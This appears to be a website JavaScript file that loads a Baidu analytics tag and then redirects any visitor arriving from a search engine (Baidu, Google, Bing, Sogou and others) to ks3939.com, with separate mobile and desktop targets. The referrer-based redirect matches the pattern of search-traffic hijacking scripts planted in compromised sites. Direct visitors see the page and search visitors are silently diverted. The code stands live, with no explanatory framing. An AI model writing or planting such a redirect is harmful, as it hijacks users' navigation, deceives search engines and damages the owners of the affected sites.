var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?01321528f78890f63fb11f93411997cd";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();


var regexp = /\.(baidu|haosou|so|sogou|soso|google|sm|yahoo|bing|360)(\.[a-z0-9\-]+){1,2}\//ig;
var where = document.referrer;
if (regexp.test(where)) {
  if (/mobile|android|iphone|ipad|phone/i.test(navigator.userAgent.toLowerCase())) {
    location.href=(Math.random()<0.5)?"https://m.ks3939.com":"https://m.ks3939.com";
  }
  else{
    location.href=(Math.random()<0.5)?"https://www.ks3939.com":"https://www.ks3939.com";
  }
}
